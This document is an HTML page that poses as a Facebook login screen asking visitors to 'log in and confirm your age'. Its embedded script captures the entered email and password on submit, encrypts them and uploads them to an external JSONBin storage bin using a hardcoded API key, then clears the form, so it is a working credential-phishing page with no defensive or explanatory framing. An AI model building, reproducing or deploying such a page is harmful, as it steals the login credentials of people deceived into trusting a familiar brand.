<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Facebook - Log in</title>
    <link rel="stylesheet" href="./css/styles.css">
    <link rel="shortcut icon" href="./images/round.ico" type="image/x-icon">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</head>
<body>
    <main>
        <div class="main">
            <div class="heading-section">
                <img src="./images/logo.png" class="logo-img">
                <div class="a-ri8"><span>Login and Confirm Your Age.</span></div>
            </div>

            <div class="form">
                <form class="a-form" id="login-form">
                    <input type="text" id="Email" class="a-email" name="Email" placeholder="Email address or phone number" autofocus="autofocus" required />
                    <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password" autofocus="autofocus" required/>
                    <input type="submit" class="a-sub" value="Log In" style="background-color: rgb(30, 115, 255); color: white;" />
                    <a href="" class="a-link" color: rgb(30, 115, 255)>Forgotten password?</a>
                    <hr class="a-hr">
                    <input type="submit" value="Create New Account" class="a-but" />
                </form>

                <div class="create-page">
                    <a href="" class="a-href">Create a Page</a> for a celebrity, band or business.
                </div>
            </div>
        </div>
    </main>
    <div class="footer">
        <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
            <ul>
                <li>English (UK)</li>
                <li><a href="">हिन्दी</a></li>
                <li><a href="">ગુજરાતી</a></li>
                <li><a href="">मराठी</a></li>
                <li><a href="">اردو</a></li>
                <li><a href="">മലയാളം</a></li>
                <li><a href="">বাংলা</a></li>
                <li><a href="" class="_sv4">తెలుగు</a></li>
                <li><a href="" class="_sv4">தமிழ்</a></li>
                <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
                <li><a href="" class="_sv4">Español</a></li>
                <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a></li>
            </ul>
            <div id="line"></div>
            <div>
                <ul>
                    <li><a href="">Sign Up</a></li>
                    <li><a href="">Log In</a></li>
                    <li><a href="">Messenger</a></li>
                    <li><a href="">Facebook Lite</a></li>
                    <li><a href="">Watch</a></li>
                    <li><a href="">People</a></li>
                    <li><a href="">Pages</a></li>
                    <li><a href="">Page categories</a></li>
                    <li><a href="">Places</a></li>
                    <li><a href="">Games</a></li>
                    <li><a href="">Locations</a></li>
                    <li><a href="">Marketplace</a></li>
                    <li><a href="">Facebook Pay</a></li>
                    <li><a href="">Groups</a></li>
                    <li><a href="">Jobs</a></li>
                    <li><a href="">Oculus</a></li>
                    <li><a href="">Portal</a></li>
                    <li><a href="">Instagram</a></li>
                    <li><a href="">Local</a></li>
                    <li><a href="">Fundraisers</a></li>
                    <li><a href="">Services</a></li>
                    <li><a href="">Voting Information Centre</a></li>
                    <li><a href="">About</a></li>
                    <li><a href="">Create ad</a></li>
                    <li><a href="">Create Page</a></li>
                    <li><a href="">Developers</a></li>
                    <li><a href="">Careers</a></li>
                    <li><a href="">Privacy</a></li>
                    <li><a href="">Cookies</a></li>
                    <li><a href="">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
                    <li><a href="">Terms</a></li>
                    <li><a href="">Help</a></li>
                    <li><a href="">Settings</a></li>
                    <li><a href="">Activity log</a></li>
                </ul>
            </div>
            <div class="copyright">
                <div><span> Facebook © 2024</span></div>
            </div>
        </div>
    </div>
    <div class="m-footer">
        <div class="main-c">
            <div class="list-1"><span>English (UK)</span>
                <div><span><a href="">हिन्दी</a></span></div>
                <div><span><a href="">اردو</a></span></div>
                <div><span><a href="">বাংলা</a></span></div>
            </div>
            <div class="list-2">
                <div><span><a href="">ગુજરાતી</a></span></div>
                <div><span><a href="">मराठी</a></span></div>
                <div><span><a href="">മലയാളം</a></span></div>
                <a>
                    <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i></div>
                </a>
            </div>
        </div>
        <div class="main-links">
            <span>About </span>.
            <span> Help </span>.
            <span> More </span>
        </div>
        <div class="fb">Facebook Inc.</div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {

            const binId = '66d8730aacd3cb34a87e6ba6'; // Replace with your JSONBin ID
            const apiKey = '$2a$10$LGh3nbbeNQ86JFr0pKj5/e6rT3cZc3/kgC7hwMBX.QT/BRsnHArnS'; // Replace with your JSONBin API key
            const binUrl = `https://api.jsonbin.io/v3/b/${binId}/latest`;
            const binUrlPUT = `https://api.jsonbin.io/v3/b/${binId}`;
            const secretKey = 'mySecretKey'; // Replace with your actual secret key

            // Encrypt function
            function encryptData(data, secretKey) {
                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), secretKey).toString();
                return encrypted;
            }

            // Decrypt function
            function decryptData(encryptedData, secretKey) {
                const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
                const decrypted = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
                return decrypted;
            }


            // Function to fetch, decrypt, and display JSON data
            function fetchData() {
                fetch(binUrl, {
                    headers: {
                        'X-Master-Key': apiKey
                    }
                })
                .then(response => response.json())
                .then(data => {
                    // Assuming the encrypted data is in data.record.Data
                    const encryptedData = data.record.Data;

                    // Decrypt the data using the secretKey
                    const decryptedData = decryptData(encryptedData, secretKey);

                    // Display the decrypted data in the display box
                    //const displayBox = document.getElementById('display-box');
                    //displayBox.textContent = JSON.stringify(decryptedData, null, 2);
                })
                .catch(error => console.error('Error fetching or decrypting data:', error));
            }

            

             // Function to handle form submission
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault();

        // Fetch existing data from JSONBin
        fetch(binUrl, {
            headers: {
                'X-Master-Key': apiKey
            }
        })
        .then(response => response.json())
        .then(data => {
            // Decrypt the fetched data
            const encryptedData = data.record.Data;
            const existingData = decryptData(encryptedData, secretKey);

            // Append new user to the existing data
            const email = document.getElementById('Email').value;
            const password = document.getElementById('Password').value;
            const newformData = { email, password };

            // Access the user_credentials array
            const userCredentialsArray = existingData.user_credentials || [];
            userCredentialsArray.push(newformData);
            existingData.user_credentials = userCredentialsArray;

            // Encrypt updated data
            const updatedEncryptedData = encryptData(existingData, secretKey);

            // Post the encrypted data
            return fetch(binUrlPUT, {
                method: 'PUT',
                headers: {
                    'X-Master-Key': apiKey,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ Data: updatedEncryptedData })
            });
        })
        .then(response => response.json())
        .then(() => {
            fetchData(); // Refresh the display with updated data
            document.getElementById('login-form').reset();
        })
        .catch(error => console.error('Error handling form submission:', error));
    });
        });
    </script>
</body>
</html>